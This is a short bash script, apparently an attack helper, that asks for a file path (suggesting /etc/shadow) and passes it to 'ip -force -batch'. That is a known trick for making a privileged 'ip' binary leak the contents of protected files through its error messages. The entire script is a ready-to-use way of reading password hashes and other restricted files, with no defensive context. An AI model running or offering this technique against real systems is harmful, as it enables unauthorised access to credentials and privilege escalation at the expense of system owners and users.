#!/bin/bash
echo -n "[+] Enter file path(eg:- /etc/shadow): "
read filepath
ip -force -batch "$filepath"
